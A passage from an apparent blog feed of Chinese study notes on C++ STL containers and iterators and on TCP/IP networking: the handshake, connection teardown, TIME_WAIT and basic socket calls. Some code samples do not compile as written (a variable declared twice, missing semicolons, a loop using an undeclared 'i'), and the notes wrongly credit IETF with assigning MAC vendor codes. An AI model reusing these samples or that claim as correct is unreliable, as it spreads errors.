class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>定义在 &lt;set&gt; 头文件中，使用该容器存储的数据，各个元素键和值完全相同，且各个元素的值不能重复（保证了各元素键的唯一性）。该容器会自动根据各个元素的键（其实也就是元素值）的大小进行升序排序。</p><p>和 map、multimap 容器不同，<strong>使用 set 容器存储的各个键值对，要求键 key 和值 value 必须相等</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">set&lt;string&gt; mySet&#123;<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;plant&quot;</span>&#125;</span><br><span class="line">string str = <span class="string">&quot;planet&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">insert</span>(str);</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">emplace</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="type">int</span> num = mySet.<span class="built_in">erase</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// 根据值定位，返回成功删除的元素个数</span></span><br><span class="line"><span class="keyword">auto</span> iter = mySet.<span class="built_in">erase</span>(myset.<span class="built_in">begin</span>(), --myset.<span class="built_in">end</span>());  <span class="comment">// 根据迭代器定位，返回删除后所指向的迭代器</span></span><br><span class="line">mySet.<span class="built_in">clear</span>()</span><br></pre></td></tr></table></figure><p>insert()函数返回的 pair 类型的值，其包含 2 个数据，一个迭代器和一个 bool 值：</p><ul><li>当向 set 容器添加元素成功时，该迭代器指向 set 容器新添加的元素，bool 类型的值为 true；</li><li>如果添加失败，即证明原 set 容器中已存有相同的元素，此时返回的迭代器就指向容器中相同的此元素，同时 bool 类型的值为 false。</li></ul><p>emplace()函数与insert()一样，也能像set容器中添加元素，且效率更高。</p><h3 id="2-3-哈希容器"><a href="#2-3-哈希容器" class="headerlink" title="2.3 哈希容器"></a>2.3 哈希容器</h3><p>C++ 11 新加入 4 种关联式容器，分别是 unordered_set 哈希集合、unordered_multiset 哈希多重集合、unordered_map 哈希映射以及 unordered_multimap 哈希多重映射。和排序容器不同，哈希容器中的元素是未排序的，元素的位置由哈希函数确定。</p><h2 id="3-iterator迭代器"><a href="#3-iterator迭代器" class="headerlink" title="3. iterator迭代器"></a>3. iterator迭代器</h2><p>在 C++ STL 中，对容器中数据的读和写，是通过迭代器完成的，扮演着容器和算法之间的胶合剂，使得算法的设计可以泛化到各种数据结构，隐藏容器的内部差异。</p><p>STL标准库为每一种标准容器定义了一种迭代器类型，这意味着，不同容器的迭代器也不同，其功能强弱也有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>常用的迭代器按功能强弱分为输入迭代器、输出迭代器、<strong>正向迭代器</strong>、<strong>双向迭代器</strong>、<strong>随机访问迭代器</strong> 5 种。主要使用后三种。</p><p><strong>1） 正向迭代器</strong></p><p>假设 p 是一个正向迭代器，则 p 支持 ++p，p++，*p 操作，还可以被复制或赋值，可以用 &#x3D;&#x3D; 和 !&#x3D; 运算符进行比较。此外，两个正向迭代器可以互相赋值。</p><p><strong>2） 双向迭代器</strong></p><p>双向迭代器具有正向迭代器的全部功能，除此之外，假设 p 是一个双向迭代器，则还可以进行 –p 或者 p– 操作（即一次向后移动一个位置）。</p><p><strong>3） 随机访问迭代器</strong></p><p>随机访问迭代器具有双向迭代器的全部功能。除此之外，假设 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p><ul><li>p+&#x3D;i：使得 p 往后移动 i 个元素。</li><li>p-&#x3D;i：使得 p 往前移动 i 个元素。</li><li>p+i：返回 p 后面第 i 个元素的迭代器。</li><li>p-i：返回 p 前面第 i 个元素的迭代器。</li><li>p[i]：返回 p 后面第 i 个元素的引用。</li></ul><p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;&#x3D;、&gt;&#x3D; 运算符进行比较。另外，表达式 p2-p1 也是有定义的，其返回值表示 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。</p><p>下表为 C++ 11 标准中不同容器所支持的迭代器类型：</p><table><thead><tr><th>容器</th><th>对应的迭代器类型</th></tr></thead><tbody><tr><td>array</td><td>随机访问迭代器</td></tr><tr><td>vector</td><td>随机访问迭代器</td></tr><tr><td>deque</td><td>随机访问迭代器</td></tr><tr><td>list</td><td>双向迭代器</td></tr><tr><td>set &#x2F; multiset</td><td>双向迭代器</td></tr><tr><td>map &#x2F; multimap</td><td>双向迭代器</td></tr><tr><td>forward_list</td><td>前向迭代器</td></tr><tr><td>unordered_map &#x2F; unordered_multimap</td><td>前向迭代器</td></tr><tr><td>unordered_set &#x2F; unordered_multiset</td><td>前向迭代器</td></tr><tr><td>stack</td><td>不支持迭代器</td></tr><tr><td>queue</td><td>不支持迭代器</td></tr></tbody></table><p><u>注意，容器适配器 stack 和 queue 没有迭代器，它们包含有一些成员函数，可以用来对元素进行访问。</u></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><table><thead><tr><th>迭代器定义方式</th><th>具体格式</th></tr></thead><tbody><tr><td>正向迭代器</td><td>容器类名::iterator 迭代器名;</td></tr><tr><td>常量正向迭代器</td><td>容器类名::const_iterator 迭代器名;</td></tr><tr><td>反向迭代器</td><td>容器类名::reverse_iterator 迭代器名;</td></tr><tr><td>常量反向迭代器</td><td>容器类名::const_reverse_iterator 迭代器名;</td></tr></tbody></table><p><code>*迭代器名</code>就可以表示迭代器指向的元素。</p><p>反向迭代器和正向迭代器的区别在于：</p><ul><li>对正向迭代器进行 ++ 操作时，迭代器会指向容器中的后一个元素；</li><li>而对反向迭代器进行 ++ 操作时，迭代器会指向容器中的前一个元素。</li></ul><p><u>注意，以上 4 种定义迭代器的方式，并不是每个容器都适用。有一部分容器同时支持以上 4 种方式，比如 array、deque、vector；而有些容器只支持其中部分的定义方式，例如 forward_list 容器只支持定义正向迭代器，不支持定义反向迭代器</u></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span>  <span class="comment">//需要引入 vector 头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;; <span class="comment">//v被初始化成有10个元素</span></span><br><span class="line">    <span class="comment">//第一种遍历方法：使用索引遍历，size返回元素个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i)</span><br><span class="line">        cout &lt;&lt; v[i] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="comment">//第二种遍历方法：创建一个正向迭代器，当然，vector也支持其他 3 种定义迭代器的方式</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (i = v.<span class="built_in">begin</span>(); i != v.<span class="built_in">end</span>(); ++i)  <span class="comment">// 或者i &lt; v.end()</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="comment">//间隔一个输出</span></span><br><span class="line">    i = v.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; v.<span class="built_in">end</span>()) &#123; </span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 随机访问迭代器支持 &quot;+= 整数&quot;  的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-函数对象"><a href="#4-函数对象" class="headerlink" title="4. 函数对象"></a>4. 函数对象</h2><p>如果一个类将 () 运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象（又称仿函数）。</p><h2 id="5-适配器"><a href="#5-适配器" class="headerlink" title="5. 适配器"></a>5. 适配器</h2><p>可以使一个类的接口（模板的参数）适配成用户指定的形式，从而让原本不能在一起工作的两个类工作在一起。值得一提的是，容器、迭代器和函数都有适配器。</p><h2 id="6-内存分配器"><a href="#6-内存分配器" class="headerlink" title="6. 内存分配器"></a>6. 内存分配器</h2><p>为容器类模板提供自定义的内存申请和释放功能，由于往往只有高级用户才有改变内存分配策略的需求，因此内存分配器对于一般用户来说，并不常用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;STL&quot;&gt;&lt;a href=&quot;#STL&quot; class=&quot;headerlink&quot; title=&quot;STL&quot;&gt;&lt;/a&gt;STL&lt;/h1&gt;&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/stl/&quot;&gt;http://c.bianch</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="https://frankcao3.github.io/posts/28758"/>
    <id>https://frankcao3.github.io/posts/28758</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="计算机网络模型"><a href="#计算机网络模型" class="headerlink" title="计算机网络模型"></a>计算机网络模型</h2><h3 id="1-1-OSI参考模型"><a href="#1-1-OSI参考模型" class="headerlink" title="1.1 OSI参考模型"></a>1.1 OSI参考模型</h3><p><strong>国际标准化组织(ISO)<strong>提出的网络体系结构模型，称为开放系统互联参考模型(OSIRM)，通常简称为</strong>OSI参考模型</strong>。</p><p>OSI有七层，自下而上依次为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。其中数据链路层在概念上常被划分为两个子层：逻辑链路控制子层(LLC)和媒体访问控制子层(MAC)。</p><p><strong>数据链路层负责分配MAC地址。</strong>MAC地址，或称物理地址，由<strong>48比特长</strong>，12个十六进制数字组成，<strong>0~23位(前6位十六进制)是厂商向IETF（ 国际互联网工程任务组）等机构申请用来标识厂商的代码</strong>。地址的24到47位由厂商自行分派，是各个厂商制造的所有网卡的一个唯一编号。 因此一个<br>网卡会有一个全球唯一固定的MAC地址，但可对应多个IP地址。MAC地址的第48位是组播地址标志位。</p><p><strong>网络层负责对数据包进行路由选择和存储转发</strong>，网络层的协议有: IP、IPX、ICMP、IGMP、ARP、RARP、OSPF 等。网络层数据的单位称为<u>分组或数据包</u>。网络层提供点到点的通信（直接相连的结点之间的通信），仅提供一台机器到另一台机器之间的通信，不会涉及程序或进程的概念。</p><p><strong>传输层是第一个<u>端到端</u>，即进程到进程的层次</strong>。传输层提供应用进程间的逻辑通信。由于一个主机可同时运行多个进程，因此传输层有复用和分用的功能。传输层的协议有: TCP、 UDP、 SCTP 等。传输层数据的单位称为<u>报文或数据段</u>。</p><p>应用层为操作系统或者网络应用程序提供访问网络服务的接口。应用层的协议有: RIP、TELNET、FTP、HTTP、SNMP等。</p><table><thead><tr><th>OSI参考模型</th><th>功能</th><th>协议</th><th>设备</th></tr></thead><tbody><tr><td>物理层</td><td></td><td></td><td>中继器、集线器</td></tr><tr><td>数据链路层</td><td>分配MAC地址</td><td></td><td>网桥、交换机</td></tr><tr><td>网络层</td><td>对数据包进行路由选择和存储转发（点到点）</td><td>IP、IPX、ICMP、IGMP、ARP、RARP、OSPF等</td><td>路由器</td></tr><tr><td>传输层</td><td>提供进程间的逻辑通信（端到端）</td><td>TCP、 UDP、 SCTP等</td><td></td></tr></tbody></table><p><strong>网关</strong>是网络层以上的中继系统。默认网关在网络层以上实现网络互连，实质上是一个网络通向其他网络的IP地址。</p><h3 id="1-2-TCP-x2F-IP模型"><a href="#1-2-TCP-x2F-IP模型" class="headerlink" title="1.2 TCP&#x2F;IP模型"></a>1.2 TCP&#x2F;IP模型</h3><p>TCP&#x2F;IP模型由于得到广泛应用而成为事实上的国际标准，从低到高依次为：网络接口层、网际层、传输层和应用层。</p><p>OSI七层模型和TCP&#x2F;IP五层模型的对应关系如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704093830695.png" alt="image-20220704093830695"></p><p><strong>网际层</strong>是TCP&#x2F;IP体系结构的关键部分。它和OSI网络层在功能上非常相似。网际层<strong>将分组发往任何网络，并为之独立地选择合适的路由，但它不保证各个分组有序到达，各个分组的有序交付由高层负责</strong>。网际层定义了标准的分组格式和协议，即IP协议。当前采用的IP协议是第4版，即IPv4，它的下一-个版本是IPv6。</p><p><strong>传输层</strong>的功能同样和OSI中的传输层类似，是<strong>使发送端和目的端主机上的对等实体可以进行会话</strong>。</p><p>传输层主要使用以下两种协议:</p><ul><li>传输控制协议（Transmission Control Protocol, TCP）。 它是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。</li><li>用户数据报协议(User Datagram Protocol, UDP)。 它是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</li></ul><p><strong>应用层</strong>包含所有的高层协议。如虚拟终端协议(Telnet)、 文件传输协议(FTP)、 域名解析服务(DNS)、电子邮件协议(SMTP)和超文本传输协议(HTTP)。</p><h2 id="传输层与socket基本操作"><a href="#传输层与socket基本操作" class="headerlink" title="传输层与socket基本操作"></a>传输层与socket基本操作</h2><h3 id="2-1-传输层"><a href="#2-1-传输层" class="headerlink" title="2.1 传输层"></a>2.1 传输层</h3><p>在下图中，展示了IPv4和IPv6。从右向左观察这个图，最右边的4个网络应用使用IPv6，另外的5个网络应用使用IPv4。</p><p>最左边的网络应用tpdump直接使用BPF（BSD分组过滤器）或DLPI（数据链路提供者接口）同数据链路层进行通信。ping使用ICMP协议。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704094553193.png" alt="image-20220704094553193"></p><h5 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h5><p>用户数据报协议(User Datagram Protocol)，<strong>面向数据报文</strong>。UDP是一种<strong>无连接</strong>协议，因为UDP客户与服务器不必存在长期的关系，例如一个UDP客户创建一个套接字并发送一个数据报给一个服务器，然后立即用同一个套接字发送另一个数据报给另外一个服务器。同样，一个UDP服务器可以用同一个UDP套接字从若干不同的客户一连串接受多个数据报。</p><p>UDP是<strong>不可靠</strong>的，不能保证最终到达它们的目的地，<strong>不保证各个数据报的先后顺序跨网络保持不变，也不保证每个数据报只到达一次</strong>。</p><p>UDP既可以使用IPv4,也可以使用IPv6。</p><h5 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h5><p>传输控制协议(Transmission Control Protocol)，<strong>面向字节流</strong>。</p><p>第一，TCP 是一种<strong>面向连接</strong>的协议，提供客户与服务器的连接。</p><p>第二，TCP提供<strong>可靠性</strong>。当使用TCP向另一端发送数据时，它要求对端返回一个确认。如果没有收到确认，TCP自动重传数据并等待更长时间。在数次重传失败后，TCP才放弃。</p><p>第三，TCP通过<strong>给所发送数据的每一个字节关联一个序列号进行排序</strong>。UDP提供不可靠的数据报传送，不提供确认、序列号、超时重传等机制。</p><p>第四，TCP<strong>提供流量控制</strong>，而UDP不提供流量控制。TCP总是告诉对端它能够接收多少字节的数据，这称为<strong>通告窗口</strong>。该窗口在任何时刻都指出接收缓冲区中的可用空间，从而确保发送端发送的数据不会溢出接收缓冲区。</p><p>第五，TCP的连接是全双工的。UDP也可以是全双工的。</p><p>TCP既可以使用IPv4，也可以使用IPv6。</p><p><strong>UDP与TCP的主要区别在于UDP不一定提供可靠的数据传输</strong>。事实上，该协议不能保证数据准确无误地到达目的地。UDP在许多方面非常有效，如UDP具有对系统资源要求较少、具有较好的实时性、网络开销小的优点。当某个程序的目标是尽快地传输尽可能多的信息时(其中任意给定数据的重要性相对较低)，可使用UDP。</p><h3 id="2-2-TCP连接的建立和终止"><a href="#2-2-TCP连接的建立和终止" class="headerlink" title="2.2 TCP连接的建立和终止"></a>2.2 TCP连接的建立和终止</h3><p>以下给出了一个基本TCP客户端和服务器程序的套接口函数：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704095345763.png" alt="image-20220704095345763"></p><p>对于服务器端，其先调用socket函数（返回一个套接字），然后套接字与地址、端口绑定（bind），对端口进行监听（listen），调用accept阻塞，等待客户端连接。</p><p>这时如果有客户端调用socket函数（返回一个套接字），然后连接服务器（connect），如果连接成功，客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把响应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100516344.png" alt="image-20220704100516344"></p><h4 id="三次握手建立连接"><a href="#三次握手建立连接" class="headerlink" title="三次握手建立连接"></a>三次握手建立连接</h4><hr><ul><li>客户端向服务器发送一个SYN J；</li><li>服务器向客户端响应一个SYN K，并对SYN J进行确认ACK J+1；</li><li>客户端再向服务器发送一个确认ACK K+1。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704100639833.png" alt="image-20220704100639833"></p><p>从图中可以看出，服务器必须准备好接受外来的连接。这通过socket、bind 和listen函数来完成，称为<strong>被动打开</strong>。</p><p>客户端通过<strong>调用connect进行主动打开</strong>。这引起客户端向服务器发送了SYN J （表示同步，它告诉服务器客户将在连接中发送的数据的初始序列号）分节，这时connect进入阻塞状态。</p><p>服务器监听到连接请求，即收到SYN J分节，<strong>调用accept函数接受请求</strong>，并向客户端发送SYN K （它告诉客户端服务器将在连接中发送的数据的初始序列号）、ACK J+1分节，这时accept进入阻塞状态。</p><p>客户端收到服务器的SYN K、ACK J+1 分节之后，这时<strong>connect返回</strong>，并对SYN K分节进行确认，再向服务器发送ACK K+1分节；</p><p>服务器收到ACK K+1分节时，<strong>accept 返回</strong>，至此三次握手完毕，连接建立。</p><p>总结：客户端的connect在三次握手的第二次返回，而服务器端的accept在三次握手的第三次返回。</p><p>&#x3D;&#x3D;<strong>TCP为什么不采用二次握手：</strong>&#x3D;&#x3D;</p><p>采用三次握手是为了防止失效的连接请求报文段突然又传送到服务器，从而发生错误。</p><p>比如，客户端第一次发送的连接请求并没有丢失，而是因为网络问题导致延迟到达服务器，<u>服务器以为是客户端又发起的新连接</u>，于是服务器同意连接，并向客服端发回确认，但是此时客户端处于建立连接的状态，所以不予理会，服务器就一直等待客户端发送数据， 导致服务器的资源浪费。</p><h4 id="四次挥手释放连接"><a href="#四次挥手释放连接" class="headerlink" title="四次挥手释放连接"></a>四次挥手释放连接</h4><hr><p><strong>&#x3D;&#x3D;建立连接需要三次握手，而终止连接需要四次挥手。这是由TCP的半关闭造成的。既然TCP连接是全双工的（数据在两个方向可以同时传递），因此每个方向必须单独地进行关闭。&#x3D;&#x3D;</strong></p><p>下图中是客户执行主动关闭，然而不管是客户还是服务器都可以执行主动关闭。通常情况下是客户执行主动关闭，但某些协议如HTTP则是服务器执行主动关闭。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704101542526.png" alt="image-20220704101542526"></p><p><img src="https://images.xiaozhuanlan.com/photo/2020/42b857c3a2046b9907075e326125d662.png" alt="img"></p><p>具体步骤: </p><ol><li><p>某个应用进程首先调用close，我们称这一端执行<strong>主动关闭</strong>。 这一端的TCP于是发送一一个FIN分节，表示数据发送完毕；</p></li><li><p>另一端接收到FIN分节之后，执行<strong>被动关闭</strong>，对这个FIN进行ACK确认。它的接收也作为文件结束符传递给接收端应用进程，因为<u>FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据</u>；</p></li><li><p><strong><u>一段时间之后</u><strong>，接收到文件结束符的应用进程调用close关闭它的套接口。这导致它的TCP</strong>也发送一一个FIN</strong>；</p></li><li><p>接收到这个FIN的原发送端TCP (即执行主动关闭的那一端) 对它<strong>进行确认</strong>。</p></li></ol><p>这样<strong>每个方向上都有一个FIN和ACK，所以一共需要四个分节</strong>。我们使用限定词“一般”是因为：有时步骤1)的FIN随数据一起发送；另外，执行被动关闭那一端的TCP在步骤2)和3)发出的ACK与FIN也可以合并成一个分节（当自己已经没有数据要发送了，可以直接关闭连接），这样的话就是三个报文完成连接的释放。</p><p>TCP关闭时，每一端都要发送一个FIN。这种情况除了在应用进程调用close时会发生，还会在进程终止时发生。进程终止包括自愿（调用exit或从main函数返回）、不自愿（进程收到一个终止本进程的信号）的情况，进程终止时所有打开的TCP连接上都会发出一个FIN。</p><p>&#x3D;&#x3D;<strong>TCP释放连接为什么需要四次挥手：</strong>&#x3D;&#x3D;</p><p>关闭连接时，<u>当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了</u>（单方向），但未必你所有的数据都全部发送给对方了，所以<u>你未必会马上关闭socket，也即你可能还需要发送一些数据给对方之后，再发送FIN报文给对方来表示你没有数据发送给对方了</u>，针对每个FIN报文，都需要一次ack报文，故需要四次挥手。</p><p><a href="https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md">https://github.com/whuchris/Interview/blob/master/Java/TCP%E5%92%8CUDP%E5%8D%8F%E8%AE%AE.md</a></p><p>握手的过程中可以说没有信息数据的传输，是一个相互应答的过程，所以服务器会将SYN ACK一起发送，但是客户端发送终止连接的时候，很有可能服务器还有一些数据没有发送完，所以服务器只是先答应，但是需要等待数据传输完毕之后再发送FIN报文，ACK和FIN是分开的，因此多了一次。</p><h3 id="2-3-TCP状态转换图"><a href="#2-3-TCP状态转换图" class="headerlink" title="2.3 TCP状态转换图"></a>2.3 TCP状态转换图</h3><hr><p>TCP连接的建立和终止可以用状态转换图来说明，如图2-5所示。这些状态可使用netstat显示，它是一个在调试客户&#x2F;服务器应用时很有用的工具。</p><p>TCP为一个连接定义了11种状态，并且TCP规则规定如何基于当前状态及在该状态下所接收的分节从一个状态转换到另一个状态。举例来说，当某个应用进程在CLOSED状态下执行主动打开时，TCP将发送一个SYN，且新的状态是SYN_ SENT。如果这个TCP接着接收到一个带ACK的SYN，它将发送一个ACK，且新的状态是ESTABLISHED。这个最终状态是绝大多数数据传送发生的状态。</p><p>自ESTABLISHED状态引出的两个箭头处理连接的终止。如果某个应用进程在接收到文件结束符之前调用close (主动关闭)，那就转换到FIN _WAIT_1状态。但如果某个应用进程在ESTABLISHED状态期间接收到一个FIN (被动关闭),那就转换到CLOSE WAIT状态。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704104439563.png" alt="image-20220704104439563"></p><p>图2-6给出了一个完整的TCP连接所发生的实际分组交换情况：建立连接、传送数据和终止连接。图中展示了每个端点所经历的TCP状态。从图2-6可见，当客户端应用程序主动请求关闭时，调用close或shutdown关闭连接，这时应用程序发送FIN，然后进入FIN_WAIT_1状态，等待服务器端发送确认包ACK，接受到服务器端的ACK以后，然后客户端进入FIN_WAIT_2状态，等待服务器端调用close, 并发送FIN,当客户端接受到FIN后，发送ACK，进入最终的TIME_WAIT状态。</p><p>需要注意的是，执行主动关闭的那一端进入&#x3D;&#x3D;TIME WAIT状态&#x3D;&#x3D;。<strong>留在TIME_ WAIT的持续的时间是&#x3D;&#x3D;MSL&#x3D;&#x3D; (最长分节生命周期Maximum Segment Liftime)时间的2倍，也就是2MSL。</strong>MSL一般情况下是30秒到2分钟，所以TIME_WAIT的时间一般为1~4分钟。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220704154040857.png" alt="image-20220704154040857"></p><p>&#x3D;&#x3D;<strong>存在TIME_WAIT状态有两个理由：</strong>&#x3D;&#x3D;</p><ul><li><p>实现终止TCP全双工连接的可靠性</p><p><u>假设最终的ACK丢失，服务器将重发最终的FIN，因此客户必须维护状态信息以允许它重发最终的ACK</u>。如果不维护状态信息，它将响应以RST，而服务器则把该分节解释成一个错误。 如果TCP打算执行所有必要的工作以彻底终止某个连接上两个方向的数据流，那么它必须能够处理连接终止序列四个分节中任何一个分节丢失的情况，也即主动关闭的那一端必须进入TIME_WAIT状态，因为它可能不得不重发最终的ACK。</p></li><li><p>允许老的重复分节在网络中消逝</p><p>我们假设12.106.32.254端口1500和206.168.112.219端口21之间有一个TCP连接，我们关闭这个连接后，在以后某个时候又重新建立起相同的IP地址和端口之间的TCP连接。后一个连接称为前一个连接的化身，因为它们的IP地址和端口号是相同的，<u>TCP必须防止来自某个连接的老重复分组在连接终止后再现，从而被误解成属于同一个连接的化身（被误解为属于新建的连接）。</u>要实现这种功能，TCP不能给处于TIME_WAIT状态的连接启动新的化身，<u>既然TME_WAIT状态的持续时间是2MSL，这就足够让某个方向上的分组最多存活MSL秒即被丢弃，另一个方向上的应答最多存活MSL秒也被丢弃</u>，通过实施这个规则，我们就能保证当成功建立一个 TCP连接时，来自该连接先前的化身的老重复分组都已在网络中消逝了。</p></li></ul><h3 id="2-4-socket的基本操作"><a href="#2-4-socket的基本操作" class="headerlink" title="2.4 socket的基本操作"></a>2.4 socket的基本操作</h3><hr><p>一个面向连接的客户端socket程序的主要步骤：</p><ol><li><p>加载套接字库</p></li><li><p>创建套接字socket()</p></li><li><p>向服务器发送连接请求connect()</p></li><li><p>和服务器端进行通信</p></li><li><p>关闭套接字close()</p></li></ol><ol><li><p><strong>socket()函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>socket函数在成功时返回一个小的非负整数值，称为套接口描述字(Socket Descriptor)， 简称套接字。这个套接字跟文件描述字相似。</p><p>socket函数的三个参数分别为:</p><ol><li><p><strong>domain</strong>：即协议域，又称为协议族(family)。常用的协议族有: AF_ INET、 AF_ INET6、AF LOCAL（或称AF_ UNIX，UNIX域socket）、AF_ ROUTE等。协议族决定了套接口的地址类型，在通信中必须采用对应的地址，如AF_ INET决定了要用IPv4地址(32位的)与端口号(16位的)的组合、AF_UNIX决定了要用一个绝对路径名作为地址。</p></li><li><p><strong>type</strong>：指定套接口类型。常用的socket类型有: SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_SEQPACKET等。</p></li><li><p><strong>protocol</strong>：指定协议。常用的协议有: IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP等，它们分别对应TCP传输协议、UDP传输协议、SCTP传输协议。</p></li></ol><p><strong>注意</strong>：上面的type 和protocol 并不是可以随意组合的，如SOCK_ STREAM不可以跟IPPROTO_ UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。</p></li><li><p><strong>bind()函数</strong></p><p>bind函数<strong>把一个本地协议地址赋予套接口</strong>。对于网际协议，协议地址是32位的IPv4地址或128位的IPv6地址与16位的TCP或UDP端口号的组合。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span> <span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> addrlen)</span> 